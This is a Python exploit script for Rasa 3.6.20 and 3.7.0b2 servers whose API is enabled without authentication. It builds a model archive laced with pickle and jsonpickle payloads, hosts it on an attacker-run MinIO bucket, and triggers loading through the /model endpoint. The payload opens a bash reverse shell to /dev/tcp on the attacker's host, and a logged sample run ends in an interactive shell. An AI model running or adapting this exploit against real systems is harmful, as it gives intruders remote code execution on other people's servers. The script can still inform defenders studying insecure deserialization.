#!/usr/bin/python3
from minio import Minio
from pwn import *
import jsonpickle
import argparse
import requests
import urllib3
import pickle
import shutil
import uuid
import json

"""
### version information
developed against version 3.6.20
tested against version 3.6.20 and 3.7.0b2
https://github.com/RasaHQ/rasa

### get rasa -> g3t 50m3 c0ff33
$ git clone https://github.com/RasaHQ/rasa.git; cd rasa

### checkout the desired version
$ git checkout tags/3.6.20

### build docker -> g3t 50m3 c0ff33
$ make build-docker

### create a volume
$ docker volume create rasa_app

### initialize rasa -> model is created
$ docker run --name rasa --rm -it -v rasa_app:/app -p 5005:5005/tcp rasa:localdev init --no-prompt

### check that the api is working
$ docker run --name rasa --rm -it -v rasa_app:/app -p 5005:5005/tcp rasa:localdev run --enable-api
$ curl -s 127.1:5005/webhooks/rest/webhook -d '{"sender": "1337", "message": "hello"}'
[{"recipient_id":"1337","text":"Hey! How are you?"}]

### stop the api server
$ docker stop rasa

### run the exploit
$ python3 exploit.py -mh 192.168.0.3 -lh 192.168.0.1
[*] starting rasa api server
[+] Starting local process '/usr/bin/docker': pid 125277
[*] rasa api server started
[*] starting minio
[*] minio credentials (web): minioadmin:9baea8181ee646e2a80cde508737cfe4
[+] Starting local process '/usr/bin/docker': pid 125496
[*] minio started
[*] creating bucket
[*] creating payload
[*] packing model
components/
components/3xpl01t/
components/3xpl01t/featurizer.json
metadata.json
[*] uploading model to minio
[*] cleaning up local exploit files
[*] listening for shell on 1337
[+] Trying to bind to :: on port 1337: Done
[+] Waiting for connections on :::1337: Got connection from ::ffff:192.168.0.2 on port 57062
[*] triggering exploit
[*] reverse connection established
[*] stopping minio
[+] Starting local process '/usr/bin/docker': pid 125693
[*] starting interactive shell
[*] Switching to interactive mode
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
rasa@654ffb364adb:~$ $ id
id
uid=1001(rasa) gid=0(root) groups=0(root)

### rasa is still running -> since the model led to exceptions the old model is still used
### depends on the used payload whether the old model is still in use
$ curl -s 127.1:5005/webhooks/rest/webhook -d '{"sender": "1337", "message": "hello"}'
[{"recipient_id":"1337","text":"Hey! How are you?"}]

### delete the existing models to speed up rasa load time
$ docker exec -it -u 0 rasa bash
# rm models/*
"""

parser = argparse.ArgumentParser(description="get a reverse shell on rasa in case the api is enabled and not protected", formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-t", "--target", default="http://localhost:5005", help="the target to be attacked; runs dockerzied rasa by default -> build the container manually")
parser.add_argument("-lh", "--lhost", required=True, help="listening host for the reverse shell")
parser.add_argument("-lp", "--lport", type=int, default=1337, help="listening port for the reverse shell; default is 1337")
parser.add_argument("-mh", "--minio-host", required=True, help="the host minio is running on; must be reachable by the exploit host as well as the target")
parser.add_argument("-map", "--minio-api-port", default="9000", help="the port the minio api is running on; default is 9000")
parser.add_argument("-mwp", "--minio-web-port", default="9001", help="the port the minio web is running on; default is 9001; may be used for debugging")
parser.add_argument("-p", "--payload", type=int, default=0, help="""the payload to be used
0 -> TEDPolicy featurizer.json
1 -> TEDPolicy ted_policy.data_example.pkl
2 -> TEDPolicy ted_policy.label_data.pkl
3 -> TEDPolicy ted_policy.fake_features.pkl
4 -> TEDPolicy ted_policy.priority.pkl
5 -> TEDPolicy ted_policy.meta.pkl
6 -> UnexpecTEDIntentPolicy unexpected_intent_policy.label_quantiles.pkl
7 -> DIETClassifier DIETClassifier.data_example.pkl
8 -> DIETClassifier DIETClassifier.label_data.pkl
9 -> DIETClassifier DIETClassifier.sparse_feature_sizes.pkl
10 -> DIETClassifier DIETClassifier.index_label_id_mapping.json
11 -> SklearnIntentClassifier SklearnIntentClassifier_classifier.pkl
12 -> SklearnIntentClassifier SklearnIntentClassifier_encoder.pkl
13 -> CountVectorsFeaturizer vocabularies.pkl
14 -> LexicalSyntacticFeaturizer feature_to_idx_dict.pkl
""")
parser.add_argument("-nc", "--no-cleanup", action="store_true", help="indicate that the created files must not be deleted")
args = parser.parse_args()

minioapi = f"http://{args.minio_host}:{args.minio_api_port}"
minioapiserver = f"{args.minio_host}:{args.minio_api_port}"
minioaccesskey = "minioadmin" #username
miniosecretkey = uuid.uuid4().hex #password
model = "99991231-133700-3xpl01t.tar.gz" #rasa takes the most recent model
bucket = "3xpl01t"
miniomodelpath = f"/{bucket}/{model}"

#jsonpickle needs the import
payload = f"import os;os.system(\"bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1' &\")"

containernamerasa = b"rasa"
containernameminio = b"minio"

#pickle payload
class EXEC:
  def __reduce__(self):
    #return os.system, (payload,)
    return exec, (payload,)

#try the pickle / jsonpickle payload locally
#pickle.loads(pickle.dumps(EXEC())); pause()
#jsonpickle.decode(jsonpickle.encode(EXEC())); pause()

#model metadata.json
if 0 <= args.payload and args.payload <= 5:
  modelpolicy = "rasa.core.policies.unexpected_intent_policy.TEDPolicy"
elif 6 <= args.payload and args.payload <= 6:
  modelpolicy = "rasa.core.policies.unexpected_intent_policy.UnexpecTEDIntentPolicy"
elif 7 <= args.payload and args.payload <= 10:
  modelpolicy = "rasa.nlu.classifiers.diet_classifier.DIETClassifier"
elif 11 <= args.payload and args.payload <= 12:
  modelpolicy = "rasa.nlu.classifiers.sklearn_intent_classifier.SklearnIntentClassifier"
elif 13 <= args.payload and args.payload <= 13:
  modelpolicy = "rasa.nlu.featurizers.sparse_featurizer.count_vectors_featurizer.CountVectorsFeaturizer"
elif 14 <= args.payload and args.payload <= 14:
  modelpolicy = "rasa.nlu.featurizers.sparse_featurizer.lexical_syntactic_featurizer.LexicalSyntacticFeaturizer"

modelresource = "3xpl01t"
modelexploit_core = f"""
      "run_3xpl01t": {{
        "needs": {{}},
        "uses": "{modelpolicy}",
        "constructor_name": "load",
        "fn": "predict_action_probabilities",
        "config": {{}},
        "eager": true,
        "is_target": false,
        "is_input": false,
        "resource": {{
          "name": "{modelresource}",
          "output_fingerprint": "7a3c0a1ffb23452f90641a6ff110a365"
        }}
      }},
      "select_prediction": {{
        "needs": {{
          "policy1337": "run_3xpl01t"
        }},
        "uses": "rasa.core.policies.ensemble.DefaultPolicyPredictionEnsemble",
        "constructor_name": "load",
        "fn": null,
        "config": {{}},
        "eager": true,
        "is_target": false,
        "is_input": false,
        "resource": null
      }}
"""

modelexploit_nlu = f"""
      "run_3xpl01t": {{
        "needs": {{}},
        "uses": "{modelpolicy}",
        "constructor_name": "load",
        "fn": "process",
        "config": {{
          "epochs": 100,
          "constrain_similarities": true
        }},
        "eager": true,
        "is_target": false,
        "is_input": false,
        "resource": {{
          "name": "{modelresource}",
          "output_fingerprint": "8fcb6c7d3e984aacae2b1e2f53314fc2"
        }}
      }}
"""

if 0 <= args.payload and args.payload <= 5:
  modelexploit = modelexploit_core
  modelcoretarget = "\"select_prediction\""
  modelnlutarget = "null"
  _metadata_filename = "ted_policy"
elif 6 <= args.payload and args.payload <= 6:
  modelexploit = modelexploit_core
  modelcoretarget = "\"select_prediction\""
  modelnlutarget = "null"
  _metadata_filename = "unexpected_intent_policy"
elif 7 <= args.payload and args.payload <= 10:
  modelexploit = modelexploit_nlu
  modelcoretarget = "null"
  modelnlutarget = "\"run_3xpl01t\""
  _metadata_filename = "DIETClassifier"
elif 11 <= args.payload and args.payload <= 12:
  modelexploit = modelexploit_nlu
  modelcoretarget = "null"
  modelnlutarget = "\"run_3xpl01t\""
  _metadata_filename = "SklearnIntentClassifier"
elif 13 <= args.payload and args.payload <= 14:
  modelexploit = modelexploit_nlu
  modelcoretarget = "null"
  modelnlutarget = "\"run_3xpl01t\""

metadata = f"""
{{
  "domain": {{}},
  "trained_at": "2024-12-31T13:37:00",
  "model_id": "e48e13207341b6bffb7fb1622282247b",
  "rasa_open_source_version": "3.6.20",
  "train_schema": {{
    "nodes": {{}}
  }},
  "predict_schema": {{
    "nodes": {{
      {modelexploit}
    }}
  }},
  "training_type": 3,
  "project_fingerprint": null,
  "core_target": {modelcoretarget},
  "nlu_target": {modelnlutarget},
  "language": "en",
  "spaces": null
}}
"""

if __name__ == "__main__":
  payloadselected = 0 <= args.payload and args.payload <= 14
  if payloadselected:
    if "localhost" in args.target:
      log.info("starting rasa api server")
      rasaapiserver = process(["docker", "run", "--name", containernamerasa, "--rm", "-v", "rasa_app:/app", "-p", "5005:5005/tcp", "rasa:localdev", "run", "--enable-api"])#, "--auth-token", "secret"]) #exploit does not work when the api is protected unless sensitive information is leaked (token, ...)
      rasaapiserver.readuntil(b"Rasa server is up and running.")
      log.info("rasa api server started")
      #rasaapiserver.interactive()

    targetstatus = requests.get(f"{args.target}/status")
    if "NotAuthenticated" in targetstatus.text:
      log.warn("server is not exploitable since the api is protected")
    else:
      log.info("starting minio")
      log.info(f"minio credentials (web): {minioaccesskey}:{miniosecretkey}")
      minio = process(["docker", "run", "--name", containernameminio, "--rm", "-p", f"{args.minio_api_port}:9000/tcp", "-p", f"{args.minio_web_port}:9001/tcp", "-e", f"MINIO_ROOT_USER={minioaccesskey}", "-e", f"MINIO_ROOT_PASSWORD={miniosecretkey}", "quay.io/minio/minio", "server", "/data", "--console-address", ":9001"]) #, "-v", "./data:/data"
      while True:
        try:
          miniohealth1 = requests.get(f"{minioapi}/minio/health/live")
          if miniohealth1.status_code == 200:
            break
        except:
          pass
      log.info("minio started")
      #minio.interactive()

      log.info("creating bucket")
      minioclient = Minio(minioapiserver, minioaccesskey, miniosecretkey, secure=False, http_client=urllib3.PoolManager(retries=urllib3.Retry(total=1337, backoff_factor=0.1, respect_retry_after_header=False, status_forcelist=[503]))) #minio takes some time to get the service available and sends retry header with 60 seconds -> http_client was changed to avoid the long retry wait time
      #minioclient.trace_on(sys.stderr)
      minioclient.make_bucket(bucket)

      policy = {
        "Version": "2012-10-17",
        "Statement": [
          {
            "Effect": "Allow",
            "Principal": {"AWS": "*"},
            "Action": [
              "s3:GetObject"
            ],
            "Resource": [
              f"arn:aws:s3:::{bucket}/{model}"
            ]
          }
        ]
      }

      minioclient.set_bucket_policy(bucket, json.dumps(policy))

      log.info("creating payload")
      modelpath = f"components/{modelresource}"
      
      #folder structure
      os.makedirs(f"{modelpath}", exist_ok=True)

      #payload
      #rasa.utils.io.pickle_load -> pickle.load -> pickle.dumps(EXEC())
      #rasa.utils.io.json_unpickle -> jsonpickle.loads -> jsonpickle.encode(EXEC())
      #rasa.shared.utilsd.io.read_json_file -> json.loads -> not exploitable with default decoder (JSONDecoder)
      #compare to train_TEDPolicy3 and train_DIETClassifier5
      #ted_policy.tf_model.data-00000-of-00001
      #ted_policy.tf_model.index
      if args.payload == 0:
        open(f"{modelpath}/featurizer.json", "w").write(jsonpickle.encode(EXEC()))
      elif args.payload == 1:
        open(f"{modelpath}/{_metadata_filename}.data_example.pkl", "wb").write(pickle.dumps(EXEC()))
      elif args.payload == 2:
        open(f"{modelpath}/{_metadata_filename}.data_example.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.label_data.pkl", "wb").write(pickle.dumps(EXEC()))
      elif args.payload == 3:
        open(f"{modelpath}/{_metadata_filename}.data_example.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.label_data.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.fake_features.pkl", "wb").write(pickle.dumps(EXEC()))
      elif args.payload == 4:
        open(f"{modelpath}/{_metadata_filename}.data_example.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.label_data.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.fake_features.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.priority.pkl", "w").write(jsonpickle.encode(EXEC()))
      elif args.payload == 5:
        open(f"{modelpath}/{_metadata_filename}.data_example.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.label_data.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.fake_features.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.priority.pkl", "w").write(jsonpickle.encode({}))
        open(f"{modelpath}/{_metadata_filename}.entity_tag_specs.json", "w").write("{}")
        open(f"{modelpath}/{_metadata_filename}.meta.pkl", "wb").write(pickle.dumps(EXEC()))
      elif args.payload == 6:
        open(f"{modelpath}/{_metadata_filename}.data_example.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.label_data.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.fake_features.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.priority.pkl", "w").write(jsonpickle.encode({}))
        open(f"{modelpath}/{_metadata_filename}.entity_tag_specs.json", "w").write("{}")
        open(f"{modelpath}/{_metadata_filename}.meta.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.label_quantiles.pkl", "wb").write(pickle.dumps(EXEC()))
      elif args.payload == 7:
        open(f"{modelpath}/{_metadata_filename}.data_example.pkl", "wb").write(pickle.dumps(EXEC()))
      elif args.payload == 8:
        open(f"{modelpath}/{_metadata_filename}.data_example.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.label_data.pkl", "wb").write(pickle.dumps(EXEC()))
      elif args.payload == 9:
        open(f"{modelpath}/{_metadata_filename}.data_example.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.label_data.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.sparse_feature_sizes.pkl", "wb").write(pickle.dumps(EXEC()))
      elif args.payload == 10:
        open(f"{modelpath}/{_metadata_filename}.data_example.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.label_data.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.sparse_feature_sizes.pkl", "wb").write(pickle.dumps({}))
        open(f"{modelpath}/{_metadata_filename}.index_label_id_mapping.json", "w").write(jsonpickle.encode(EXEC()))
      elif args.payload == 11:
        open(f"{modelpath}/{_metadata_filename}_classifier.pkl", "w").write(jsonpickle.encode(EXEC()))
      elif args.payload == 12:
        open(f"{modelpath}/{_metadata_filename}_classifier.pkl", "w").write(jsonpickle.encode({}))
        open(f"{modelpath}/{_metadata_filename}_encoder.pkl", "w").write(jsonpickle.encode(EXEC()))
      elif args.payload == 13:
        open(f"{modelpath}/vocabularies.pkl", "w").write(jsonpickle.encode(EXEC()))
      elif args.payload == 14:
        open(f"{modelpath}/feature_to_idx_dict.pkl", "w").write(jsonpickle.encode(EXEC()))

      #metadata.json
      open(f"metadata.json", "w").write(metadata)

      log.info("packing model")
      os.system(f"tar -czvf {model} components/ metadata.json")

      log.info("uploading model to minio")
      minioclient.fput_object(bucket, model, model) #bucket_name, object_name, file_path

      if not args.no_cleanup:
        log.info("cleaning up local exploit files")
        shutil.rmtree("components/")
        os.remove("metadata.json")
        os.remove(model)

      log.info(f"listening for shell on {args.lport}")
      l = listen(args.lport)

      log.info("triggering exploit")
      requests.put(f"{args.target}/model", json={"model_server": {"url": f"{minioapi}{miniomodelpath}"}, "remote_storage": "aws"})

      l.wait_for_connection()
      log.info("reverse connection established")

      log.info("stopping minio")
      p = process(["docker", "stop", containernameminio])
      p.readuntil(containernameminio)

      log.info("starting interactive shell")
      l.interactive()
  
    if "localhost" in args.target:
      log.info("stopping rasa")
      p = process(["docker", "stop", containernamerasa])
      p.readuntil(containernamerasa)

  else:
    log.warn("no valid payload selected")
